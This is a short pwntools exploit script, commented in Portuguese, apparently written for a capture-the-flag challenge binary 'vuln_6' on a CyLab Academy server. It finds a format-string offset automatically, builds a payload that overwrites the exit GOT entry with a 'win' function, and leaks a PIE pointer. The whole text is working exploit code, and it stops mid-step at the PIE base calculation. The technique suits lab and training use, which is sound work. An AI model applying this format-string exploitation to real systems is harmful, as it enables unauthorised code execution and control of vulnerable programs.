from pwn import *

binary = './vuln_6'
context.binary = elf = ELF(binary)

# Função de callback exigida pelo FmtStr para interagir com o binário e vazar a memória
def send_payload(payload):
    p = remote('xebec.cylabacademy.net', 13366) # Atualize para a porta atual
    p.sendlineafter(b'Enter your name:', payload)
    # O binário printa a resposta logo após o input
    response = p.recvline()
    p.close()
    return response

# Deixa o pwntools descobrir sozinho qual índice da stack controla o format string
autofmt = FmtStr(send_payload)
offset_index = autofmt.offset
log.success(f"Índice de Format String descoberto automaticamente: {offset_index}")

# Agora abrimos a conexão definitiva para aplicar o exploit
p = remote('xebec.cylabacademy.net', 13366)

# Construímos o payload usando o índice exato descoberto para vazar o ponteiro do PIE
payload = fmtstr_payload(offset_index, {elf.got['exit'] : elf.symbols['win']}) # Ou usamos o leak manual seguro:
# Vamos fazer o leak manual limpo usando o offset encontrado:
p.sendlineafter(b'Enter your name:', f"%{offset_index}$p".encode())

response = p.recvline().strip()
# Filtra apenas o endereço hexadecimal retornado
leak = int(response, 16)
log.success(f"Leak obtido: {hex(leak)}")

# Ajusta a base do PIE (dependendo de qual ponteiro o índice apontar, se for o .text)